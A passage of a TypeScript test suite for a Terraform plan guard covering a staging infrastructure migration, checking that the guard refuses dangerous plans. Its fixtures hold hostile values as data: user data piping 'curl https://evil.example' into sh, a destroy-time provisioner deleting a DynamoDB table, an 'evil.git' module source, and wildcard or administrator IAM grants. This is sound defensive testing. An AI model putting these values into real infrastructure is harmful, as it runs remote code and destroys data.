    rc(nm, `${H}.aws_iam_role.host`).change.after.name = "gs-staging-app-task";
    rejects("host-create", nm, /not gs-staging-host-app/);
    const nb = plan("host-create");
    nb.resource_changes = (nb.resource_changes as Obj[]).filter((r) => r.type !== "aws_budgets_budget");
    nb.variables.budget = { value: { enabled: false } };
    rejects("host-create", nb, /the budget is REQUIRED/);
    const lc = plan("host-create");
    (lc.resource_changes as Obj[]).push(rc(plan("ecr-lifecycle"), `${H}.aws_ecr_lifecycle_policy.server[0]`));
    rejects("host-create", lc, /no authority, ECS-era or duplicate resource/);
    const up = plan("host-create");
    Object.assign(rc(up, `${H}.aws_security_group.host`).change, { actions: ["update"], before: { name: "x" } });
    rejects("host-create", up, /the host stack is NEW/);
    const tbl = plan("host-create");
    (tbl.resource_changes as Obj[]).push(resourceChange({ module: H, type: "aws_dynamodb_table", name: "game", actions: ["create"], before: null, after: { name: "gs-staging-game-g1" } }));
    rejects("host-create", tbl, /no authority, ECS-era or duplicate resource/);
    const pool = plan("host-create");
    pool.variables.game_generations = { value: [1, 2] };
    rejects("host-create", pool, /game_generations = \[1,2\]/);
  });
  test("the exposure: no SSH from the migration, 443 only from CloudFront's prefix list, 80 only for ACME", () => {
    const ssh = plan("host-create");
    (ssh.resource_changes as Obj[]).push(resourceChange({ module: H, type: "aws_vpc_security_group_ingress_rule", name: "emergency_ssh", index: "0.0.0.0/0", actions: ["create"], before: null, after: { ip_protocol: "tcp", from_port: 22, to_port: 22, cidr_ipv4: "0.0.0.0/0" } }));
    rejects("host-create", ssh, /emergency SSH is not opened/);
    const open = plan("host-create");
    Object.assign(rc(open, `${H}.aws_vpc_security_group_ingress_rule.https_from_cloudfront`).change.after, { prefix_list_id: null, cidr_ipv4: "0.0.0.0/0" });
    rejects("host-create", open, /only from CloudFront's origin-facing prefix list/);
    const port = plan("host-create");
    Object.assign(rc(port, `${H}.aws_vpc_security_group_ingress_rule.acme_http01`).change.after, { from_port: 0, to_port: 65535 });
    rejects("host-create", port, /admits port 80 only/);
  });
  test("ecr-lifecycle: too few images kept, an age rule on tagged images, another repository", () => {
    const set = (p: Obj, rules: unknown[]) => {
      rc(p, `${H}.aws_ecr_lifecycle_policy.server[0]`).change.after.policy = jsonencode({ rules });
    };
    const few = plan("ecr-lifecycle");
    set(few, [{ rulePriority: 1, selection: { tagStatus: "any", countType: "imageCountMoreThan", countNumber: 5 }, action: { type: "expire" } }]);
    rejects("ecr-lifecycle", few, /keeps only 5 images/);
    const age = plan("ecr-lifecycle");
    set(age, [{ rulePriority: 1, selection: { tagStatus: "any", countType: "sinceImagePushed", countUnit: "days", countNumber: 30 }, action: { type: "expire" } }]);
    rejects("ecr-lifecycle", age, /could expire the running release/);
    const repo = plan("ecr-lifecycle");
    rc(repo, `${H}.aws_ecr_lifecycle_policy.server[0]`).change.after.repository = "gs-prod-server";
    rejects("ecr-lifecycle", repo, /on repository gs-prod-server/);
  });
});

describe("COST-2B false-negative probes: the cutover and the rollback", () => {
  const D = `${A}.aws_cloudfront_distribution.site[0]`;
  test("anything else of the distribution moving is refused", () => {
    const mutate: Array<[string, (a: Obj) => void, RegExp]> = [
      ["the /gs* origin-request policy", (a) => (a.ordered_cache_behavior[0].origin_request_policy_id = "orp-allowlist"), /the \/gs\* behaviour/],
      ["the /gs* cache policy", (a) => (a.ordered_cache_behavior[0].cache_policy_id = "658327ea-f89d-4fab-a63d-7e88639e58f6"), /the \/gs\* behaviour/],
      ["the aliases", (a) => (a.aliases = ["play.example.org", "evil.example.org"]), /the aliases/],
      ["the certificate", (a) => (a.viewer_certificate[0].acm_certificate_arn = "arn:aws:acm:us-east-1:111111111111:certificate/other"), /the viewer certificate/],
      ["the origin protocol", (a) => (a.origin.find((o: Obj) => o.origin_id === "gs-alb").custom_origin_config[0].origin_protocol_policy = "http-only"), /more than its domain name/],
      ["the origin path", (a) => (a.origin.find((o: Obj) => o.origin_id === "gs-alb").origin_path = "/x"), /more than its domain name/],
      ["an extra origin", (a) => a.origin.push({ ...a.origin[0], origin_id: "extra" }), /the origin set changes/],
      ["the WAF", (a) => (a.web_acl_id = "arn:aws:wafv2:x"), /the WAF/],
      ["disabled", (a) => (a.enabled = false), /enabled/],
    ];
    for (const [what, f, why] of mutate) {
      const p = plan("edge-cutover");
      f(rc(p, D).change.after);
      rejects("edge-cutover", p, why);
      assert.ok(what);
    }
    const unk = plan("edge-cutover");
    rc(unk, D).change.after_unknown.origin = [{ domain_name: true }];
    rejects("edge-cutover", unk, /origins are unknown until apply/);
    const orp = plan("edge-cutover");
    Object.assign(rc(orp, `${A}.aws_cloudfront_origin_request_policy.gs`).change, { actions: ["update"], after: { ...rc(orp, `${A}.aws_cloudfront_origin_request_policy.gs`).change.before, query_strings_config: [{ query_string_behavior: "whitelist", query_strings: ["cp"] }] } });
    rejects("edge-cutover", orp, /no table, key, IAM or document authority mutated/);
    const tf = plan("edge-cutover");
    tf.variables.compute = { value: "none" };
    rejects("edge-cutover", tf, /still compute = ecs/);
  });
  test("the rollback: only p1, only desired 0 -> 1, the routing read at plan time", () => {
    const both = plan("ecs-rollback");
    Object.assign(rc(both, `${A}.aws_ecs_service.pool["p1"]`).change.after, { task_definition: "arn:aws:ecs:us-east-1:111111111111:task-definition/gs-staging-p1:8" });
    rejects("ecs-rollback", both, /also changes task_definition/);
    const two = plan("ecs-rollback");
    rc(two, `${A}.aws_ecs_service.pool["p1"]`).change.after.desired_count = 2;
    rejects("ecs-rollback", two, /0 -> 1 only/);
    const cf = plan("ecs-rollback");
    Object.assign(rc(cf, D).change, { actions: ["update"], after: { ...rc(cf, D).change.before, origin: rc(plan("edge-cutover"), D).change.after.origin } });
    rejects("ecs-rollback", cf, /aws_cloudfront_distribution\.site\[0\] \[update\]: NOT PART OF THIS STEP/);
    const route = plan("ecs-rollback");
    for (const r of route.prior_state.values.root_module.child_modules[0].resources as Obj[]) if (r.name === "routing") r.values.item = JSON.stringify({ fmt: { N: "1" }, primary_pool: { S: "p2" } });
    rejects("ecs-rollback", route, /routing primary p2/);
  });
});

describe("COST-2B false-negative probes: the teardown", () => {
  const del = (p: Obj, address: string) => Object.assign(rc(p, address).change, { actions: ["delete"], after: null });
  test("an ECS-era object left behind, forgotten, or a core class missing is refused", () => {
    const left = plan("compute-none");
    Object.assign(rc(left, `${A}.aws_vpc_endpoint.interface["kms"]`).change, { actions: ["no-op"], after: rc(left, `${A}.aws_vpc_endpoint.interface["kms"]`).change.before });
    rejects("compute-none", left, /left behind .*interface\["kms"\]/);
    const forgot = plan("compute-none");
    Object.assign(rc(forgot, `${A}.aws_lb.this[0]`).change, { actions: ["forget"] });
    rejects("compute-none", forgot, /leaves it running and billed/);
    const gone = plan("compute-none");
    gone.resource_changes = (gone.resource_changes as Obj[]).filter((r) => r.address !== `${A}.aws_lb.this[0]`);
    gone.prior_state.values.root_module.child_modules[0].resources = (gone.prior_state.values.root_module.child_modules[0].resources as Obj[]).filter((r) => r.address !== `${A}.aws_lb.this[0]`);
    rejects("compute-none", gone, /not destroyed: aws_lb\.this\[0\]/);
    const noPrior = plan("compute-none");
    delete noPrior.prior_state;
    rejects("compute-none", noPrior, /carries no prior_state/);
  });
  test("bootstrap / operator authority, ECR, the Juno document, the edge: never destroyed", () => {
    for (const address of [`${A}.aws_iam_role.bootstrap`, `${A}.aws_iam_role_policy.bootstrap`, `${A}.aws_iam_role.operator[0]`, `${A}.aws_iam_role_policy.operator[0]`, `${A}.aws_ecr_repository.server`, `${A}.aws_ssm_parameter.juno_backend[0]`, `${A}.aws_cloudfront_origin_request_policy.gs`]) {
      const p = plan("compute-none");
      del(p, address);
      rejects("compute-none", p, /ABSOLUTELY FORBIDDEN/);
    }
  });
  test("the narrowing: only the retired pool's documents may leave a policy; p1's document only loses p2's route", () => {
    const widened = plan("compute-none");
    const doc = JSON.parse(rc(widened, `${A}.aws_iam_role_policy.operator[0]`).change.after.policy);
    doc.Statement.find((s: Obj) => s.Sid === "LedgerRead").Action = ["dynamodb:GetItem", "dynamodb:Scan", "dynamodb:PutItem"];
    rc(widened, `${A}.aws_iam_role_policy.operator[0]`).change.after.policy = JSON.stringify(doc);
    rejects("compute-none", widened, /LedgerRead changes more than its resources/);
    const more = plan("compute-none");
    const d2 = JSON.parse(rc(more, `${A}.aws_iam_role_policy.bootstrap`).change.after.policy);
    d2.Statement.find((s: Obj) => s.Sid === "ReadConfiguration").Resource = `arn:aws:ssm:us-east-1:111111111111:parameter/gs/staging/juno-backend`;
    rc(more, `${A}.aws_iam_role_policy.bootstrap`).change.after.policy = JSON.stringify(d2);
    rejects("compute-none", more, /loses more than the retired pools' runtime documents/);
    const gen = plan("compute-none");
    const d3 = JSON.parse(runtimeDocument(["p1"]));
    d3.generation = 2;
    d3.game_table = "gs-staging-game-g2";
    rc(gen, `${A}.aws_ssm_parameter.runtime["p1"]`).change.after.insecure_value = jsonencode(d3);
    rejects("compute-none", gen, /changes more than its route table/);
    rejects("compute-none", gen, /names gs-staging-game-g2/);
    const route = plan("compute-none");
    rc(route, `${A}.aws_ssm_parameter.runtime["p1"]`).change.after.insecure_value = runtimeDocument([]);
    rejects("compute-none", route, /the route table must become exactly/);
  });
  test("re-creations, the gates off, g2 imported, break-glass on", () => {
    const rec = plan("compute-none");
    (rec.resource_changes as Obj[]).push(resourceChange({ module: A, type: "aws_iam_role", name: "recovery", index: 0, actions: ["create"], before: null, after: { name: "gs-staging-recovery" } }));
    rejects("compute-none", rec, /nothing created/);
    const off = plan("compute-none");
    off.variables.start_services = { value: false };
    rejects("compute-none", off, /start_services = false/);
    const deferred = plan("compute-none");
    (deferred.resource_changes as Obj[]).push(resourceChange({ module: A, mode: "data", type: "aws_dynamodb_table_item", name: "routing", index: 0, actions: ["read"], before: null, after: {} }));
    rejects("compute-none", deferred, /deferred to apply/);
    const g2 = plan("compute-none");
    const imp = resourceChange({ module: A, type: "aws_dynamodb_table", name: "game", index: "2", actions: ["update"], before: { name: "gs-staging-game-g2" }, after: { name: "gs-staging-game-g2", deletion_protection_enabled: true } });
    (imp.change as Obj).importing = { id: "gs-staging-game-g2" };
    (g2.resource_changes as Obj[]).push(imp);
    g2.variables.game_generations = { value: [1, 2] };
    rejects("compute-none", g2, /nothing imported/);
    rejects("compute-none", g2, /every other generation stays inert/);
    const bg = plan("compute-none");
    bg.variables.recovery_break_glass = { value: true };
    rejects("compute-none", bg, /recovery_break_glass = true/);
    const two = plan("compute-none");
    two.variables.pools = { value: { p1: { primary: true }, p2: { primary: false, desired_count: 0 } } };
    rejects("compute-none", two, /exactly \{ p1 = \{ primary = true \} \}/);
  });
});

describe("COST-2B independent review: the proven false acceptances stay refused", () => {
  const POLICY = `${H}.aws_iam_role_policy.host`;
  const realHost = (): Obj => JSON.parse(read(`${FIXTURE_DIR}/terraform-real/host-create.json`)) as Obj;
  const REAL_CTX = { ...CTX, appAccountId: "123456789012" };
  const withStatement = (p: Obj, st: Obj): Obj => {
    const r = (p.resource_changes as Obj[]).find((x) => x.address === POLICY)!;
    const doc = JSON.parse(r.change.after.policy);
    doc.Statement.push({ Sid: "X", Effect: "Allow", ...st });
    r.change.after.policy = JSON.stringify(doc);
    return p;
  };
  test("host policy: wildcard resources, wildcard / case-variant / PartiQL actions, unscoped Sign and GetParameter", () => {
    const cases: Array<[Obj, RegExp]> = [
      [{ Action: ["dynamodb:PutItem", "dynamodb:UpdateItem", "dynamodb:DeleteItem"], Resource: "*" }, /Resource "\*" for a scopable action/],
      [{ Action: ["dynamodb:PutItem"], Resource: "arn:aws:dynamodb:*:*:table/*" }, /a wildcard table resource/],
      [{ Action: ["dynamodb:*Item"], Resource: "arn:aws:dynamodb:us-east-1:111111111111:table/gs-staging-game-g1" }, /X: dynamodb:\*Item/],
      [{ Action: ["dynamodb:Delete*", "dynamodb:Update*", "dynamodb:Put*"], Resource: "arn:aws:dynamodb:us-east-1:111111111111:table/gs-staging-identity" }, /X: dynamodb:Delete\*/],
      [{ Action: ["dynamodb:UpdateTabl?"], Resource: "arn:aws:dynamodb:us-east-1:111111111111:table/gs-staging-game-g1" }, /UpdateTabl\?/],
      [{ Action: ["dynamodb:PartiQLUpdate"], Resource: "arn:aws:dynamodb:us-east-1:111111111111:table/gs-staging-game-g1" }, /PartiQLUpdate/],
      [{ Action: ["IAM:*", "DynamoDB:DeleteTable", "STS:AssumeRole", "KMS:ScheduleKeyDeletion"], Resource: "*" }, /X: IAM:\*/],
      [{ Action: ["kms:Sign"], Resource: "*", Condition: { StringEquals: { "kms:MessageType": "DIGEST", "kms:SigningAlgorithm": "ECDSA_SHA_256" } } }, /Resource "\*" for a scopable action/],
      [{ Action: ["ssm:GetParameter"], Resource: "arn:aws:ssm:us-east-1:111111111111:parameter/*" }, /statements the module does not render: X/],
      [{ Action: ["lambda:InvokeFunction", "sqs:SendMessage"], Resource: "*" }, /lambda:InvokeFunction/],
    ];
    for (const [st, why] of cases) {
      rejects("host-create", withStatement(plan("host-create"), st), why);
      rejects("host-create", withStatement(realHost(), st), why, REAL_CTX);
    }
    /* an existing statement widened in place (no new Sid) -- the exact match catches what no diagnostic names */
    const w = plan("host-create");
    const r = (w.resource_changes as Obj[]).find((x) => x.address === POLICY)!;
    const doc = JSON.parse(r.change.after.policy);
    doc.Statement.find((s: Obj) => s.Sid === "ReadRuntimeConfiguration").Resource.push("arn:aws:ssm:us-east-1:111111111111:parameter/gs/staging/runtime/p2");
    r.change.after.policy = JSON.stringify(doc);
    rejects("host-create", w, /statements that differ from the module's rendering: ReadRuntimeConfiguration/);
    const lower = plan("host-create");
    const r2 = (lower.resource_changes as Obj[]).find((x) => x.address === POLICY)!;
    r2.change.after.policy = String(r2.change.after.policy).replace('"Effect":"Allow"', '"Effect":"allow"');
    rejects("host-create", lower, /differ from the module's rendering/);
    const dup = plan("host-create");
    const r3 = (dup.resource_changes as Obj[]).find((x) => x.address === POLICY)!;
    r3.change.after.policy = String(r3.change.after.policy).replace('"Sid":"IdentityTable"', '"Resource":"*","Sid":"IdentityTable"');
    rejects("host-create", dup, /ambiguous \(a duplicate key/);
  });
  test("authority attached outside the inline policy: trust, managed / inline policies, profiles, the attachment's role", () => {
    const mut = (f: (p: Obj) => void, why: RegExp) => {
      for (const [p, ctx] of [[plan("host-create"), CTX], [realHost(), REAL_CTX]] as Array<[Obj, MigrationContext]>) {
        f(p);
        rejects("host-create", p, why, ctx);
      }
    };
    const at = (p: Obj, a: string) => (p.resource_changes as Obj[]).find((x) => x.address === `${H}.${a}`)!.change;
    mut((p) => {
      const t = JSON.parse(at(p, "aws_iam_role.host").after.assume_role_policy);
      t.Statement[0].Principal = { AWS: "*" };
      at(p, "aws_iam_role.host").after.assume_role_policy = JSON.stringify(t);
    }, /trust policy is not exactly EC2 of this account/);
    mut((p) => {
      at(p, "aws_iam_role.host").after.managed_policy_arns = ["arn:aws:iam::aws:policy/AdministratorAccess"];
    }, /managed policies attached/);
    mut((p) => {
      at(p, "aws_iam_role.host").after.inline_policy = [{ name: "x", policy: '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' }];
    }, /an inline_policy block/);
    mut((p) => {
      at(p, "aws_iam_instance_profile.host").after.role = "gs-staging-operator";
    }, /wraps gs-staging-operator/);
    mut((p) => {
      at(p, "aws_instance.host").after.iam_instance_profile = "gs-staging-operator";
    }, /the instance profile is gs-staging-operator/);
    mut((p) => {
      at(p, "aws_iam_role_policy.host").after.role = "gs-staging-bootstrap";
    }, /attached to gs-staging-bootstrap/);
    mut((p) => {
      at(p, "aws_security_group.host").after.ingress = [{ from_port: 0, to_port: 65535, protocol: "-1", cidr_blocks: ["0.0.0.0/0"] }];
    }, /inline ingress rules/);
    mut((p) => {
      Object.assign(at(p, `aws_vpc_security_group_egress_rule.https["443"]`).after, { ip_protocol: "-1", from_port: null, to_port: null });
    }, /tcp 443 \/ the Juno ports only/);
    mut((p) => {
      at(p, "aws_instance.host").after.metadata_options[0].http_put_response_hop_limit = 64;
    }, /hop limit is 64/);
    mut((p) => {
      at(p, "aws_instance.host").after.key_name = "operator";
    }, /an SSH key pair is set/);
    mut((p) => {
      at(p, "aws_instance.host").after.disable_api_termination = false;
    }, /termination protection is off/);
  });
  test("forged entries: an address borrowing another type, a nested module, a repeated address", () => {
    const c1 = plan("compute-none");
    const lb = clone(rc(c1, `${A}.aws_lb.this[0]`));
    (c1.resource_changes as Obj[]).push({ ...lb, address: `${A}.aws_dynamodb_table.game["1"]`, index: "1" });
    rejects("compute-none", c1, /every entry is what its address says, once/);
    const c2 = plan("compute-none");
    (c2.resource_changes as Obj[]).push({ ...clone(lb), address: `${A}.module.nested.aws_lb.this[0]`, module_address: `${A}.module.nested` });
    rejects("compute-none", c2, /every entry is what its address says|outside this stack's module/);
    const s1 = plan("host-create");
    const alarm = clone(rc(s1, `${H}.aws_cloudwatch_metric_alarm.health`));
    (s1.resource_changes as Obj[]).push({ ...alarm, type: "aws_autoscaling_group", name: "health" });
    rejects("host-create", s1, /every entry is what its address says, once/);
  });
  test("a duplicate gs-alb origin; ECR policies that are not exactly the module's", () => {
    const e = plan("edge-cutover");
    const after = rc(e, `${A}.aws_cloudfront_distribution.site[0]`).change.after;
    after.origin.unshift({ ...clone(after.origin[1]), domain_name: "evil.example.net" });
    rejects("edge-cutover", e, /duplicate origin_id/);
    const set = (text: string): Obj => {
      const p = plan("ecr-lifecycle");
      rc(p, `${H}.aws_ecr_lifecycle_policy.server[0]`).change.after.policy = text;
      return p;
    };
    rejects("ecr-lifecycle", set(jsonencode({ rules: [{ rulePriority: 1, selection: { tagStatus: "any", countType: "imageCountMoreThan" }, action: { type: "expire" } }] })), /keeps only undefined images/);
    rejects("ecr-lifecycle", set(jsonencode({ rules: [{ rulePriority: 1, selection: { tagStatus: "untagged", countType: "sinceImagePushed", countUnit: "days", countNumber: 1 }, action: { type: "expire" } }] })), /not exactly the module's two rules/);
    const good = String(rc(plan("ecr-lifecycle"), `${H}.aws_ecr_lifecycle_policy.server[0]`).change.after.policy);
    rejects("ecr-lifecycle", set(`{"rules":[],${good.slice(1)}`), /a duplicate key/);
    const keep = plan("ecr-lifecycle");
    keep.variables.ecr_keep_images = { value: 5 };
    rejects("ecr-lifecycle", keep, /keeps only 5 images/);
  });
});

describe("COST-2B independent review, round 2: what the plan carries beyond resource_changes", () => {
  const callOf = (p: Obj): Obj => Object.values(p.configuration.root_module.module_calls as Obj)[0] as Obj;
  test("a provisioner anywhere in the configuration (create- or destroy-time) is refused, in every gate", () => {
    for (const gate of GATE_NAMES) {
      const p = plan(gate);
      callOf(p).module.resources[0].provisioners = [{ type: "local-exec", expressions: { command: { constant_value: "aws dynamodb delete-table --table-name gs-staging-game-g1" } }, when: "destroy" }];
      rejects(gate, p, /provisioner\(s\) local-exec/);
    }
    const real = JSON.parse(read(`${FIXTURE_DIR}/terraform-real/host-create.json`)) as Obj;
    callOf(real).module.resources[0].provisioners = [{ type: "local-exec" }];
    rejects("host-create", real, /provisioner/, { ...CTX, appAccountId: "123456789012" });
  });
  test("an unexpected data source, a foreign provider, an ephemeral resource, a foreign module source, a missing configuration", () => {
    const d = plan("compute-none");
    callOf(d).module.resources.push({ address: "data.external.x", mode: "data", type: "external", name: "x", provider_config_key: "external" });
    rejects("compute-none", d, /data source external/);
    const l = plan("ledger-host-authorize");
    callOf(l).module.resources.push({ address: "data.aws_lambda_invocation.x", mode: "data", type: "aws_lambda_invocation", name: "x" });
    rejects("ledger-host-authorize", l, /data source aws_lambda_invocation/);
    const pr = plan("edge-cutover");
    pr.configuration.provider_config.external = { name: "external", full_name: "registry.terraform.io/hashicorp/external" };
    rejects("edge-cutover", pr, /provider external = registry\.terraform\.io\/hashicorp\/external/);
    const eph = plan("ecs-rollback");
    callOf(eph).module.resources.push({ address: "ephemeral.aws_lambda_invocation.x", mode: "ephemeral", type: "aws_lambda_invocation", name: "x" });
    rejects("ecs-rollback", eph, /mode ephemeral/);
    const src = plan("host-create");
    callOf(src).source = "git::https://example.org/evil.git//modules/single-host";
    rejects("host-create", src, /from git::https/);
    const none = plan("ecr-lifecycle");
    delete none.configuration;
    rejects("ecr-lifecycle", none, /carries no configuration/);
  });
  test("a data source read at apply, an object of another provider, an unknown top-level section (actions)", () => {
    for (const gate of GATE_NAMES) {
      const p = plan(gate);
      const m = GATES[gate].stack === "ledger" ? L : GATES[gate].stack === "app" ? A : H;
      const r = resourceChange({ module: m, mode: "data", type: "external", name: "x", actions: ["read"], before: null, after: {}, reason: "read_because_dependency_pending" });
      (p.resource_changes as Obj[]).push(r);
      rejects(gate, p, /every data source read at plan time/);
      const q = plan(gate);
      q.action_invocations = [{ address: "action.aws_lambda_invoke.x", type: "aws_lambda_invoke", trigger: { event: "after_update" } }];
      rejects(gate, q, /sections this guard does not judge \(fail closed\): action_invocations/);
    }
    const f = plan("compute-none");
    rc(f, `${A}.aws_lb.this[0]`).provider_name = "registry.terraform.io/evil/aws";
    rejects("compute-none", f, /objects of another provider/);
  });
  test("host-create: the ENI, the EIP association, the alarms, the log group, the budget", () => {
    const m = (f: (p: Obj) => void, why: RegExp) => {
      const p = plan("host-create");
      f(p);
      rejects("host-create", p, why);
    };
    const after = (p: Obj, a: string) => rc(p, `${H}.${a}`).change.after;
    m((p) => (after(p, "aws_network_interface.host").security_groups = ["sg-0wideopen"]), /names existing security groups/);
    m((p) => (after(p, "aws_network_interface.host").subnet_id = "subnet-other"), /the ENI is in subnet-other/);
    m((p) => (after(p, "aws_network_interface.host").source_dest_check = false), /source\/destination check off/);
    m((p) => (after(p, "aws_eip_association.host").instance_id = "i-0other"), /an existing instance_id/);
    m((p) => (after(p, "aws_cloudwatch_metric_alarm.health").alarm_actions = ["arn:aws:automate:us-east-1:ec2:terminate"]), /alarm_actions .*exactly alarm_action_arns/);
    m((p) => (after(p, "aws_cloudwatch_metric_alarm.status_check").dimensions = { InstanceId: "i-0other" }), /the new instance's id only/);
    m((p) => (after(p, "aws_cloudwatch_metric_alarm.health").namespace = "AWS/EC2"), /watches AWS\/EC2/);
    m((p) => (after(p, "aws_cloudwatch_log_group.host").kms_key_id = "arn:aws:kms:us-east-1:111111111111:key/x"), /no KMS key/);
    m((p) => (after(p, "aws_budgets_budget.monthly[0]").limit_amount = "3000.00"), /<= \$30/);
    m((p) => (after(p, "aws_instance.host").user_data_base64 = Buffer.from("#!/bin/sh\ncurl https://evil.example | sh\n").toString("base64")), /user_data_base64 is known at plan time/);
  });
  test("host-create: the policy's ledger, keys and region come from the operator, not from the plan", () => {
    const foreign = plan("host-create");
    const otherLedger = "arn:aws:dynamodb:us-east-1:333333333333:table/gs-staging-ledger";
    foreign.variables.ledger_table_arn = { value: otherLedger };
    const r = rc(foreign, `${H}.aws_iam_role_policy.host`);
    r.change.after.policy = String(r.change.after.policy).split(FIXTURE.ledgerTableArn).join(otherLedger);
    rejects("host-create", foreign, /the host policy's inputs do not match/);
    rejects("host-create", plan("host-create"), /the host policy's inputs do not match/, { ...CTX, ledgerTableArn: undefined });
    rejects("host-create", plan("host-create"), /the host policy's inputs do not match/, { ...CTX, signingKeyArns: [...FIXTURE.signingKeyArns.slice(0, 2), "arn:aws:kms:us-east-1:222222222222:key/44444444-4444-4444-8444-444444444444"] });
    rejects("host-create", plan("host-create"), /the host policy's inputs do not match/, { ...CTX, region: "eu-west-1" });
  });
  test("a -var ecr_keep_images=20 (a raw string) is read as the number", () => {
    const p = plan("ecr-lifecycle");
    p.variables.ecr_keep_images = { value: "20" };
    assert.equal(judgeOf("ecr-lifecycle", p).verdict, "PASS");
  });
});

describe("COST-2B independent review, round 3: a removed block's destroy-time provisioner", () => {
  test("a delete because the resource block is gone (a root removed {} can run a provisioner the plan never shows) is refused", () => {
    /* Reproduced by the reviewer on Terraform 1.16.5: the plan JSON's only trace is the action_reason. */
    const p = plan("compute-none");
    rc(p, `${A}.aws_cloudwatch_metric_alarm.flip_window["p1"]`).action_reason = "delete_because_no_resource_config";
    rejects("compute-none", p, /flip_window\["p1"\] \(delete_because_no_resource_config\).*destroy-time provisioner/);
    const q = plan("compute-none");
    delete rc(q, `${A}.aws_lb.this[0]`).action_reason;
    rejects("compute-none", q, /aws_lb\.this\[0\] \(no reason\)/);
    const r = plan("compute-none");
    const call = Object.values(r.configuration.root_module.module_calls as Obj)[0] as Obj;
    call.module.resources = (call.module.resources as Obj[]).filter((x) => !(x.type === "aws_lb" && x.name === "this"));
    rejects("compute-none", r, /aws_lb\.this\[0\] \(delete_because_count_index, its resource no longer declared\)/);
    const s = plan("compute-none");
    delete (Object.values(s.configuration.root_module.module_calls as Obj)[0] as Obj).source;
    rejects("compute-none", s, /module app from undefined/);
  });
});

describe("COST-2B: the plan envelope", () => {
  test("errored, not applyable, deferred, foreign module, unknown move, empty", () => {
    const e = plan("host-create");
    e.errored = true;
    rejects("host-create", e, /the plan errored/);
    const na = plan("host-create");
    na.applyable = false;
    rejects("host-create", na, /not applyable/);
    const df = plan("ledger-host-authorize");
    df.deferred_changes = [{ reason: "provider_config_unknown" }];
    rejects("ledger-host-authorize", df, /nothing deferred/);
    const fm = plan("ledger-host-authorize");
    (fm.resource_changes as Obj[]).push(resourceChange({ module: "module.app", type: "aws_ecs_service", name: "pool", index: "p1", actions: ["update"], before: { desired_count: 0 }, after: { desired_count: 1 } }));
    rejects("ledger-host-authorize", fm, /entries outside this stack's module/);
    const mv = plan("compute-none");
    rc(mv, `${A}.aws_dynamodb_table.identity`).previous_address = `${A}.aws_dynamodb_table.identity_old`;
    rejects("compute-none", mv, /moves outside modules\/app\/moved\.tf's set/);
    const okMove = plan("compute-none");
    rc(okMove, `${A}.aws_dynamodb_table.game["1"]`).previous_address = `${A}.aws_dynamodb_table.game`;
    assert.equal(judgeOf("compute-none", okMove).verdict, "PASS");
    rejects("host-create", {}, /resource_changes/);
    rejects("host-create", "not a plan", /resource_changes/);
  });
  test("-var on the command line: raw strings read like tfvars values; unreadable HCL fails closed", () => {
    /* A real `terraform show -json` records a CLI -var as the raw string (seen on Terraform 1.16 against a mock AWS). */
    const a = plan("ledger-task-deauthorize");
    a.variables.ecs_task_role_authorized = { value: "false" };
    a.variables.app_runtime_role_arns = { value: JSON.stringify([HOST_ROLE]) };
    assert.equal(judgeOf("ledger-task-deauthorize", a).verdict, "PASS");
    const t = plan("compute-none");
    t.variables.start_services = { value: "true" };
    t.variables.recovery_break_glass = { value: "false" };
    assert.equal(judgeOf("compute-none", t).verdict, "PASS");
    const hcl = plan("compute-none");
    hcl.variables.pools = { value: "{ p1 = { primary = true } }" };
    rejects("compute-none", hcl, /pools = "\{ p1 = \{ primary = true \} \}"/);
    const g = plan("host-create");
    g.variables.game_generations = { value: "[1,2]" };
    rejects("host-create", g, /game_generations = \[1,2\]/);
  });
});

/* ------------------------------------------------------------------ */

describe("COST-2B NAT deletion evidence", () => {
  const NAT = "nat-0123456789abcdef0";
  const VPC = "vpc-0123456789abcdef0";
  const START = Date.parse("2026-10-05T15:00:00Z");
  const hours = (n: number, value = 0, stat = "Sum") => Array.from({ length: n }, (_, i) => ({ Timestamp: new Date(START + i * 3600_000).toISOString().replace(".000", ""), [stat]: value, Unit: "Count" }));
  const valid = (): Record<keyof typeof NAT_FILES, Obj> => ({
    capture: { format: NAT_EVIDENCE_FORMAT, environment: "staging", region: "us-east-1", nat_gateway_id: NAT, vpc_id: VPC, teardown_applied_at: "2026-10-05T14:21:07Z", metrics_start: "2026-10-05T15:00:00Z", metrics_end: "2026-10-06T15:00:00Z", captured_at: "2026-10-06T15:04:00Z" },
    natGateways: { NatGateways: [{ NatGatewayId: NAT, VpcId: VPC, SubnetId: "subnet-public-a", State: "available", NatGatewayAddresses: [{ AllocationId: "eipalloc-1", NetworkInterfaceId: "eni-nat", PublicIp: "198.51.100.7" }] }] },
    routeTables: {
      RouteTables: [
        { RouteTableId: "rtb-public", VpcId: VPC, Associations: [{ Main: true, RouteTableId: "rtb-public" }, { Main: false, SubnetId: "subnet-public-a" }], Routes: [{ DestinationCidrBlock: "0.0.0.0/0", GatewayId: "igw-1" }] },
        { RouteTableId: "rtb-private", VpcId: VPC, Associations: [{ Main: false, SubnetId: "subnet-private-a" }, { Main: false, SubnetId: "subnet-private-b" }], Routes: [{ DestinationCidrBlock: "10.0.0.0/16", GatewayId: "local" }, { DestinationCidrBlock: "0.0.0.0/0", NatGatewayId: NAT }] },
      ],
    },
    subnets: { Subnets: ["subnet-public-a", "subnet-public-b", "subnet-private-a", "subnet-private-b"].map((s) => ({ SubnetId: s, VpcId: VPC })) },
    networkInterfaces: {
      NetworkInterfaces: [
        { NetworkInterfaceId: "eni-nat", SubnetId: "subnet-public-a", VpcId: VPC, InterfaceType: "nat_gateway", Description: `Interface for NAT Gateway ${NAT}` },
        { NetworkInterfaceId: "eni-host", SubnetId: "subnet-public-b", VpcId: VPC, InterfaceType: "interface", Description: "18Cosmos staging single host" },
      ],
    },
    activeConnections: { Label: "ActiveConnectionCount", Datapoints: hours(24, 0, "Maximum") },
    bytesOut: { Label: "BytesOutToDestination", Datapoints: hours(24) },
    bytesIn: { Label: "BytesInFromSource", Datapoints: hours(24) },
  });
  const fails = (e: Obj, why: RegExp) => {
    const r = judgeNatEvidence(e as NatEvidence);
    assert.equal(r.verdict, "FAIL");
    const text = r.checks.filter((c) => c.status === "fail").map((c) => `${c.name}: ${c.detail}`);
    assert.ok(text.some((t) => why.test(t)), `${why} expected; got ${text.join(" | ")}`);
  };
  test("an unused, quiet NAT PASSES (evidence only)", () => {
    const r = judgeNatEvidence(valid() as NatEvidence);
    assert.equal(r.verdict, "PASS", r.checks.map((c) => `${c.status} ${c.name}: ${c.detail}`).join("\n"));
  });
  test("a workload behind the NAT (any interface type) FAILS", () => {
